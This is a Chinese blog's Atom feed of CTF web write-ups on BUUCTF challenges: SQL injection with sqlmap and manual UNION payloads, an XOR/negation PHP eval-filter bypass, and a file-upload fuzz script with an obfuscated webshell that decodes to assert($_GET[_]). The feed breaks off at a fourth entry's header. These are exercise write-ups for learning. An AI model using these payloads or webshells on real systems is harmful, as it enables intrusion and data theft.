<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>inanb</title>
  
  <subtitle>昨夜雨疏风骤 浓睡不消残酒</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-03T10:37:07.834Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>inanb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>b01lers2020-Life_on_Mars</title>
    <link href="http://example.com/2021/09/03/b01lers2020-Life_on_Mars/"/>
    <id>http://example.com/2021/09/03/b01lers2020-Life_on_Mars/</id>
    <published>2021-09-03T09:42:32.238Z</published>
    <updated>2021-09-03T10:37:07.834Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>sqlmap使用练习</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#sqlmap">sqlmap</a></li><li><a href="#%E6%89%8B%E5%B7%A5">手工</a></li></ul><!-- tocstop --></div><br><blockquote><p>为了快速探测漏洞，自动化扫描很重要，专门来练习sqlmap</p></blockquote><h4><span id="sqlmap">sqlmap</span></h4><img src="/images/b01lers2020-Life_on_Mars/image-20210903174505885.png" alt="image-20210903174505885" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903174656965.png" alt="image-20210903174656965" style="zoom:80%;"><p>联合查询……</p><p>获得库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia --dbs</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903174917424.png" alt="image-20210903174917424" style="zoom:80%;"><p>获得表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia --tables -D alien_code</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903175030391.png" alt="image-20210903175030391" style="zoom:80%;">.</p><p>获得字段名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81/query?search=chryse_planitia --columns -D alien_code -T code</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903175142744.png" alt="image-20210903175142744" style="zoom:80%;"><p>获取字段内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81/query?search=chryse_planitia --dump -D alien_code -T code -C code</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903175252109.png" alt="image-20210903175252109" style="zoom:80%;"><p>获得flag！</p><h4><span id="手工">手工</span></h4><p>获取库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(group_concat(schema_name))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903182412381.png" alt="image-20210903182412381"></p><p>获取表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;alien_code&#39;))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903182623802.png" alt="image-20210903182623802"></p><p>获取字段名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;code&#39;))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903183329390.png" alt="image-20210903183329390"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(code)from(alien_code.code)))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903183648548.png" alt="image-20210903183648548"></p><p>wuhu~</p><p>参考文章:<br><a href="https://www.jianshu.com/p/5b4eac2e071d">sqlmap常用命令及用法</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;sqlmap使用练习&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>ISITDTU-2019-EasyPHP</title>
    <link href="http://example.com/2021/09/03/ISITDTU-2019-EasyPHP/"/>
    <id>http://example.com/2021/09/03/ISITDTU-2019-EasyPHP/</id>
    <published>2021-09-03T03:15:58.421Z</published>
    <updated>2021-09-03T04:08:29.293Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>取反、异或、bypass、rce</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%BA%90%E7%A0%81">源码</a></li><li><a href="#%E7%BB%95%E8%BF%87">绕过</a></li></ul><!-- tocstop --></div><br><h4><span id="源码">源码</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字<br>‘“`$&amp;.,|[{_defgops              匹配这些字符<br>\x7F                            匹配DEL(\x7F)字符</p></blockquote><p>同时要求使用的符号不得超过16</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ok = [];</span><br><span class="line">$s  = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">$match = <span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    $char = chr($i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match($match, $char))&#123;</span><br><span class="line">        $ok[$i] = $char;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($ok);</span><br></pre></td></tr></table></figure><p>查可用的字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$array=get_defined_functions();<span class="comment">//返回所有内置定义函数</span></span><br><span class="line">$match = <span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match($match, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.PHP_EOL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可直接使用的函数</p><p>很少，还是要根据取反的思路来构造。没有限制字符串总长度，可以肆意构造</p><h4><span id="绕过">绕过</span></h4><p>接下来绕过字符数</p><p>除去<code>() ; ^ %ff</code>，可用字符只有9种</p><p>比如我们构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)^(%FF%FF%FF%FF%FF%FF%FF))(((%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)^(%FF%FF%FF%FF%FF%FF%FF))((%D1)^(%FF)));</span><br><span class="line"><span class="comment">//print_r(scandir(.))</span></span><br></pre></td></tr></table></figure><p>此时使用字符有16种，我们需要通过反复异或来用其他字符表示这三个字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先: a^a^a &#x3D; a</span><br><span class="line">若: c^d^i &#x3D; n</span><br><span class="line">则: ~n &#x3D; ~c^d^i &#x3D;&gt; n^0xff &#x3D; c^d^i^0xff</span><br><span class="line">其他字符: a^a^a^0xff &#x3D; a^0xff &#x3D; a^0xff^0xff^0xff</span><br></pre></td></tr></table></figure><p>所以我们指定规则，对要替换的字符找三个异或字符串(<em>不影响其他字符</em>)，后再构造一次异或，就可以替换指定字符。</p><p>规则脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;scdeafle&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;nir&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(a)^<span class="built_in">ord</span>(b)^<span class="built_in">ord</span>(c) == <span class="built_in">ord</span>(m):</span><br><span class="line">                    print(<span class="string">&quot;&#123;&#125; = &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;</span>.<span class="built_in">format</span>(m, a, b, c), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    print(<span class="string">&quot; ---&gt; &quot;</span>+<span class="string">&quot;%&#123;:x&#125; = %&#123;:x&#125; ^ %&#123;:x&#125; ^ %&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(m)^<span class="number">255</span>, <span class="built_in">ord</span>(a)^<span class="number">255</span>, <span class="built_in">ord</span>(b)^<span class="number">255</span>, <span class="built_in">ord</span>(c)^<span class="number">255</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    print(<span class="string">&quot; ===&gt; &quot;</span>+<span class="string">&quot;&#x27;&#123;&#125;&#x27;,[&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;]&quot;</span>.<span class="built_in">format</span>(m,a,b,c))</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/images/ISITDTU-2019-EasyPHP/image-20210903114357978.png" alt="image-20210903114357978" style="zoom:80%;"><p>字符串生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//@inanb</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rep</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $t;</span><br><span class="line">    <span class="keyword">public</span> $e1;</span><br><span class="line">    <span class="keyword">public</span> $e2;</span><br><span class="line">    <span class="keyword">public</span> $e3;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$target,$arry</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;t = $target;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e1 = $arry[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e2 = $arry[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e3 = $arry[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fullescape</span>(<span class="params">$in</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $out = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($in);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $hex = dechex(ord($in[$i]));</span><br><span class="line">        <span class="keyword">if</span> ($hex==<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            $out = $out.urlencode($in[$i]);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $out = $out .<span class="string">&#x27;%&#x27;</span>.((strlen($hex)==<span class="number">1</span>) ? (<span class="string">&#x27;0&#x27;</span>.strtoupper($hex)):(strtoupper($hex)));</span><br><span class="line">    &#125;</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%20&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;%5F&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;%2E&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;%2D&#x27;</span>,$out);</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">&quot;scandir&quot;</span>; $len = strlen($str); $str1 = $str2 = $str3 = $str;</span><br><span class="line">$xor = str_repeat(<span class="string">&quot;%ff&quot;</span>, $len);</span><br><span class="line"></span><br><span class="line">$mode1 = <span class="keyword">new</span> rep(<span class="string">&#x27;n&#x27;</span>,[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;l&#x27;</span>]);</span><br><span class="line">$mode2 = <span class="keyword">new</span> rep(<span class="string">&quot;i&quot;</span>,[<span class="string">&quot;c&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;l&quot;</span>]);</span><br><span class="line">$mode3 = <span class="keyword">new</span> rep(<span class="string">&quot;r&quot;</span>,[<span class="string">&quot;s&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>]);</span><br><span class="line"></span><br><span class="line">$str1 = str_replace($mode1-&gt;t,$mode1-&gt;e1,$str1);$str2 = str_replace($mode1-&gt;t,$mode1-&gt;e2,$str2);$str3 = str_replace($mode1-&gt;t,$mode1-&gt;e3,$str3);</span><br><span class="line">$str1 = str_replace($mode2-&gt;t,$mode2-&gt;e1,$str1);$str2 = str_replace($mode2-&gt;t,$mode2-&gt;e2,$str2);$str3 = str_replace($mode2-&gt;t,$mode2-&gt;e3,$str3);</span><br><span class="line">$str1 = str_replace($mode3-&gt;t,$mode3-&gt;e1,$str1);$str2 = str_replace($mode3-&gt;t,$mode3-&gt;e2,$str2);$str3 = str_replace($mode3-&gt;t,$mode3-&gt;e3,$str3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;((&#x27;</span>.fullescape(~$str1).<span class="string">&#x27;)^(&#x27;</span>.fullescape(~$str2).<span class="string">&#x27;)^(&#x27;</span>.fullescape(~$str3).<span class="string">&#x27;)^(&#x27;</span>.$xor.<span class="string">&#x27;))&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>写得有点粗糙🤣，添加规则需要加mode，并对三个字串再处理一下</p></blockquote><p>目录下有一个flag文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//readfile(end(scandir(.))) end返回数组最后一个元素</span></span><br><span class="line">((%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">9</span>C%<span class="number">93</span>%<span class="number">9</span>A)^(%<span class="number">9</span>B%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>A)^(%<span class="number">9</span>A%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>A)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">9</span>A%<span class="number">9</span>C%<span class="number">9</span>B)^(%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B)^(%<span class="number">9</span>A%<span class="number">93</span>%<span class="number">9</span>B)^(%ff%ff%ff))(((%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">9</span>B%<span class="number">9</span>C%<span class="number">8</span>C)^(%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">9</span>B)^(%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">93</span>%<span class="number">9</span>B%<span class="number">93</span>%<span class="number">9</span>A)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure><img src="/images/ISITDTU-2019-EasyPHP/image-20210903115014297.png" alt="image-20210903115014297" style="zoom:80%;"><p>参考文章:<br><a href="%5Bhttps://blog.csdn.net/fmyyy1/article/details/116171155?utm_term=2019%5DEasyPHP%5BISITDTU&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116171155&spm=3001.4430%5D(https://blog.csdn.net/fmyyy1/article/details/116171155?utm_term=2019%5DEasyPHP%5BISITDTU&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116171155&spm=3001.4430)">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;取反、异或、bypass、rce&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-2018-GetShell</title>
    <link href="http://example.com/2021/08/31/SUCTF-2018-GetShell/"/>
    <id>http://example.com/2021/08/31/SUCTF-2018-GetShell/</id>
    <published>2021-08-31T12:37:17.632Z</published>
    <updated>2021-08-31T13:06:58.431Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>神奇的绕过rce</p><a id="more"></a></blockquote><h4><span id="源码">源码</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件上传检测……</p><p>fuzz脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii_str</span>():</span></span><br><span class="line">    str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        str_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span></span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_list = ascii_str()</span><br><span class="line">url = <span class="string">&quot;http://30aab2f9-a474-461d-82c0-3306918ca114.node4.buuoj.cn:81/index.php?act=upload&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fuzz <span class="keyword">in</span> str_list:</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&quot;12345&quot;</span> + fuzz, <span class="string">&#x27;application/text&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line">    res = response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Stored&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        print(<span class="string">&quot;该字符可以通过:  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(fuzz))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;过滤字符:  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(fuzz))</span><br></pre></td></tr></table></figure><p><img src="/images/SUCTF-2018-GetShell/image-20210831210425130.png" alt="image-20210831210425130"></p><p>过滤了很多字符</p><h4><span id="神奇rce">神奇rce</span></h4><p>我们可以利用汉字取反获得元素进行拼接</p><p><img src="/images/SUCTF-2018-GetShell/image-20210831210435406.png" alt="image-20210831210435406"></p><p>利用获得的字典拼接shell</p><img src="/images/SUCTF-2018-GetShell/image-20210831210444208.png" alt="image-20210831210444208" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=[];$_=($__==$__);</span><br><span class="line">$__=~(枕);$___.=$__[$_];$__=~(挑);$___.=$__[$_];$__=~(挑);$___.=$__[$_];$__=~(的);$___.=$__[$_];$__=~(荣);$___.=$__[$_];$__=~(苦);$___.=$__[$_];</span><br><span class="line">$__=~(样);$____.=$__[$_];$__=~(一);$____.=$__[$_];$__=~(座);$____.=$__[$_];$__=~(站);$____.=$__[$_];</span><br><span class="line">$_=$$____;$___($_[_]);</span><br><span class="line"><span class="comment">//assert($_GET[_])</span></span><br></pre></td></tr></table></figure><p>结合蚁剑，读environ获取flag</p><img src="/images/SUCTF-2018-GetShell/image-20210831210651989.png" alt="image-20210831210651989" style="zoom:80%;"><p>参考文章:<br><a href="https://mochu.blog.csdn.net/article/details/107729445">参考链接</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">浅谈PHP代码执行中出现过滤限制的绕过执行方法</a></p><div class="toc" tabindex="1"><!-- toc --><!-- tocstop --></div><br>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;神奇的绕过rce&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>红明谷CTF-2021-write_shell</title>
    <link href="http://example.com/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/"/>
    <id>http://example.com/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/</id>
    <published>2021-08-31T03:42:12.897Z</published>
    <updated>2021-08-31T03:47:06.549Z</updated>
    
